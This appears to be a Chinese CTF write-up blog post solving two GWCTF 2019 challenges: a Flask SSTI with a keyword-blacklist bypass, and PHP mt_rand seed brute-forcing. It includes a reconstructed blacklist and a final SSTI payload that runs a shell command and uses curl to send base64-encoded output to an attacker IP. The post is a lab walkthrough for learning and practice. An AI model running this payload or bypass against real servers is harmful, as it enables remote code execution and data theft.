---
title: GWCTF 2019 复现
date: 2020-04-30
image: 
description: 广东外语外贸大学主办的比赛
categories: 
- ctf_writeup
tags:
- SSTI
- 伪随机数
---
之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现

------

### [你的名字](https://buuoj.cn/challenges#[GWCTF%202019]你的名字)

考点：flaskSSTI、绕过`{{}}`过滤、黑名单过滤逻辑错误

很详细的SSTI>>：https://xz.aliyun.com/t/6885#toc-4

SSTIbypass姿势>>https://p0sec.net/index.php/archives/120/

参考：>>[ggb0n](http://ggb0n.cool/2020/03/04/GWCTF2019复现/)

打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。

尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting '{' in \var\WWW\html\test.php on line 13 ”

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170318.png)

不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；

但是可以通过 `{%%}` 类似的方式来进行注入，尝试 `{%if 1%}1{% endif%}` ，发现服务器直接给出500错误。。。判断可能有什么过滤

直接输入if，返回结果是：

```
hello !
```

说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。

参考了师傅写的wp，fuzz出来的过滤可能是这个样子：

```
blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',
                 'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',
                 'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 
                 'func_globals', 'config']
for no in blacklist:
    while True:
        if no in s:
            s = s.replace(no, '')
        else:
            break
return s
```

考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 `if=>iconfigf` ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 `config` 被替换之后，过滤也就结束了。

那么我们在所有被过滤的关键词中间都可以插入一个config来避开过滤；

最终playlaod：

```
{% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`ls \|base64`') %}1{% endiconfigf %}
#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机
```

flag{a2bc941d-a38d-42bb-97be-fe2440442cdf}

 

 

 

### [枯燥的抽奖](https://buuoj.cn/challenges#[GWCTF%202019]枯燥的抽奖)

考点：PHP逆向脚本、PHP伪随机数爆破

打开题目，叫你猜数据，并且给了前10位：

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170333.png)

随便输一个提交，随即给出源码：

```
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

意思大概是：

一个20次的循环，每次从 `$str_long1` 随机取一个字符，拼接成最后的 `$str` 。

- 当 `mt_rand()` 函数运行的时候，会检查有没有播种 `mt_srand` 如果已经播种了，就直接取随机数，其实这里和C语言一样（PHP底层是C）如果不每次重新播种的话，随机数怎么取都是一样的

我们来写段代码。

```
<?php
mt_srand(12345);
echo mt_rand()."<br/>";
?>
```

我们访问，输出 `162946439` 。

现在代码改为

```
<?php 
mt_srand(12345); 
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
?>
```

我们再次访问:

```
162946439

247161732

1463094264

1878061366

394962642
```

现在细心的人可能已经发现，第一个数 `162946439` 存在猫腻了。

为什么生成随机数会一样呢？我们多次访问。震惊:
还是

```
162946439

247161732

1463094264

1878061366

394962642
```

其实，这就是伪随机数的漏洞，存在可预测性。

生成伪随机数是线性的，你可以理解为 `y=ax` , `x` 就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数)了吗
当然，实际上更复杂肯定。

我知道种子后，可以确定你输出伪随机数的序列。
知道你的随机数序列，可以确定你的种子。

用到的是爆破，已经有写好的[C脚本](https://www.openwall.com/php_mt_seed/)了。

我们的思路就是根据他给出的10为数据，来爆破他的随机数种子，然后在把剩下的随机数输出

因为是用的php_mt_seed，我们要用他的格式，这是转换成随机数的脚本

```
<?php
$pass_now = "JAfq968Gqy";//给出的密钥
$allowable_characters = '
abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';//字母表

$length = strlen($allowable_characters) - 1;

for ($j = 0; $j < strlen($pass_now); $j++) {//遍历密钥
    for ($i = 0; $i < $length; $i++) {//遍历字母表
        if ($pass_now[$j] == $allowable_characters[$i]) {
            echo "$i $i 0 $length ";
            break;
        }
    }
}
?>
```

运行，得到

```
45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 34 34 0 61 42 
42 0 61 16 16 0 61 24 24 0 61
```

把php_mt_seed下载解压之后，运行命令：

```
make
./php_mt_seed 45 45 0 61 36 36 0 61 5 5 0 61 16 16 0 61 35 35 0 61 32 32 0 61 
34 34 0 61 42 42 0 61 16 16 0 61 24 24 0 61
```

可以得到他的随机数种子

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170347.png)

然后我们直接把他原来的代码拷贝过来，种子替换为我们爆破出来的：

```
<?php
mt_srand(591614089);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 20);
echo $str_show;
?>
```

运行得到一串字符 `JAfq968GqyhRKQTHLc8j` ，开头恰巧就是他给的，提交获得flag

flag{37c86593-2593-4566-b3cd-18081cbe44d0}